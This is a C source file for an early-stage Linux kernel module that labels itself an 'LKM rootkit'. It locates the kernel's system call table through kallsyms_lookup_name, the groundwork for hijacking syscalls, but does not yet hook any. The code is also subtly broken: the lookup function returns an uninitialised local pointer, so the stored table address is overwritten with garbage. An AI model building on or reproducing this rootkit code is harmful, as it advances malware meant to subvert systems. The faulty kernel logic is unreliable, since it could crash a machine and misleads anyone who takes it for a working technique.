#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h> // this will give us access to kallsys_lookup_name function.
#include <linux/unistd.h> // contains syscall number
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("w3w3w3");
MODULE_DESCRIPTION("LKM rootkit");
MODULE_VERSION("0.0.1");

unsigned long * __sys_call_table = NULL;


static unsigned long *get_syscall_table(void) {
    unsigned long *syscall_table;

    #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
        __sys_call_table = (unsigned long *) kallsyms_lookup_name("sys_call_table");
    #endif

    return syscall_table;
}

static int __init mode_init(void) {
    printk(KERN_INFO "rootkit:init\n");

    __sys_call_table = get_syscall_table();
    return 0;
}

static void __exit mode_exit(void) {
    printk(KERN_INFO "rootkit:exit\n");
}

module_init(mode_init);
module_exit(mode_exit);